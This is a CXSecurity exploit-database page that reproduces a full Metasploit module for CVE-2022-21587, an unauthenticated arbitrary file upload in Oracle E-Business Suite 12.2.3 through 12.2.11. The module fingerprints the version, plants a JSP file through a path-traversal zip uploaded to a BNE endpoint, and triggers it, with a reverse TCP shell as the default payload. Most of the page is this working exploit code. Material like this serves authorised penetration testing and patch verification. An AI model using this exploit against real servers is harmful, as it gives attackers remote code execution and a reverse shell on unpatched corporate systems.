---
title: Oracle E-Business Suite (EBS) Unauthenticated Arbitrary File Upload
url: https://cxsecurity.com/issue/WLB-2023030001
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2023-03-02
fetch_date: 2025-10-04T08:24:08.980317
---

# Oracle E-Business Suite (EBS) Unauthenticated Arbitrary File Upload

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Oracle E-Business Suite (EBS) Unauthenticated Arbitrary File Upload** **2023.03.01**  Credit:  **[sf](https://cxsecurity.com/author/sf/1/)**  Risk: **High**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2022-21587](https://cxsecurity.com/cveshow/CVE-2022-21587/ "Click to see CVE-2022-21587")**  CWE: **[CWE-264](https://cxsecurity.com/cwe/CWE-264 "Click to see CWE-264")** | |

##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
require 'rex/zip'
class MetasploitModule < Msf::Exploit::Remote
Rank = ExcellentRanking
prepend Msf::Exploit::Remote::AutoCheck
include Msf::Exploit::Remote::HttpClient
include Msf::Exploit::FileDropper
def initialize(info = {})
super(
update\_info(
info,
'Name' => 'Oracle E-Business Suite (EBS) Unauthenticated Arbitrary File Upload',
'Description' => %q{
This module exploits an unauthenticated arbitrary file upload vulnerability in Oracle Web Applications
Desktop Integrator, as shipped with Oracle EBS versions 12.2.3 through to 12.2.11, in
order to gain remote code execution as the oracle user.
},
'Author' => [
'sf', # MSF Exploit & Rapid7 Analysis
'HMs', # Python PoC
'l1k3beef', # Original Discoverer
],
'References' => [
['CVE', '2022-21587'],
['URL', 'https://attackerkb.com/topics/Bkij5kK1qK/cve-2022-21587/rapid7-analysis'],
['URL', 'https://blog.viettelcybersecurity.com/cve-2022-21587-oracle-e-business-suite-unauth-rce/'],
['URL', 'https://github.com/hieuminhnv/CVE-2022-21587-POC']
],
'DisclosureDate' => '2022-10-01',
'License' => MSF\_LICENSE,
'Platform' => %w[linux],
'Arch' => ARCH\_JAVA,
'Privileged' => false, # Code execution as user 'oracle'
'Targets' => [
[
'Oracle EBS on Linux (OVA Install)',
{
'Platform' => 'linux',
'EBSBasePath' => '/u01/install/APPS/fs1/',
'EBSUploadPath' => 'EBSapps/appl/bne/12.0.0/upload/',
'EBSFormsPath' => 'FMW\_Home/Oracle\_EBS-app1/applications/forms/forms/'
}
]
],
'DefaultOptions' => {
'PAYLOAD' => 'java/jsp\_shell\_reverse\_tcp'
},
'Notes' => {
'Stability' => [CRASH\_SAFE],
'Reliability' => [REPEATABLE\_SESSION],
'SideEffects' => [ARTIFACTS\_ON\_DISK, IOC\_IN\_LOGS]
}
)
)
register\_options(
[
Opt::RPORT(8000)
]
)
end
def check
res = send\_request\_cgi(
'method' => 'GET',
'uri' => '/OA\_HTML/FrmReportData'
)
return CheckCode::Unknown('Connection failed') unless res
return CheckCode::Unknown unless res.code == 200
match = res.body.match(%r{jsLibs/Common(\d+\_\d+\_\d+)})
if match && (match.length == 2)
version = Rex::Version.new(match[1].gsub('\_', '.'))
if version.between?(Rex::Version.new('12.2.3'), Rex::Version.new('12.2.11'))
return CheckCode::Appears("Oracle EBS version #{version} detected.")
end
return CheckCode::Safe("Oracle EBS version #{version} detected.")
end
CheckCode::Safe
end
def exploit
endpoints = %w[BneViewerXMLService BneDownloadService BneOfflineLOVService BneUploaderService]
target\_url = "/OA\_HTML/#{endpoints.sample}"
print\_status("Targeting the endpoint: #{target\_url}")
jsp\_name = Rex::Text.rand\_text\_alpha\_lower(3..8) + '.jsp'
jsp\_path = '../' \* target['EBSUploadPath'].split('/').length
jsp\_path << "#{target['EBSFormsPath']}#{jsp\_name}"
jsp\_absolute\_path = "#{target['EBSBasePath']}#{target['EBSFormsPath']}#{jsp\_name}"
zip = Rex::Zip::Archive.new
zip.add\_file(jsp\_path, payload.encoded)
# The ZIP file is expected to be encoded with the binary to text encoding mechanism called uuencode.
# For a detailed description refer to the Rapid7 AttackerKB analysis in the References section of this module.
uue\_data = "begin 777 #{Rex::Text.rand\_text\_alpha\_lower(3..8)}.zip\n"
uue\_data << [zip.pack].pack('u')
uue\_data << "end\n"
uue\_name = "#{Rex::Text.rand\_text\_alpha\_lower(3..8)}.uue"
mime = Rex::MIME::Message.new
mime.add\_part(uue\_data, 'text/plain', nil, %(form-data; name="file"; filename="#{uue\_name}"))
register\_file\_for\_cleanup(jsp\_absolute\_path)
res = send\_request\_cgi(
{
'method' => 'POST',
'uri' => target\_url,
'vars\_get' => { 'bne:uueupload' => 'true' },
'encode\_params' => true,
'ctype' => "multipart/form-data; boundary=#{mime.bound}",
'data' => mime.to\_s
}
)
unless res && res.code == 200 && res.body.include?('bne:text="Cannot be logged in as GUEST."')
fail\_with(Failure::UnexpectedReply, 'Failed to upload the payload')
end
print\_status('Triggering the payload...')
send\_request\_cgi(
'method' => 'GET',
'uri' => "/forms/#{jsp\_name}"
)
end
end

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2023030001)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top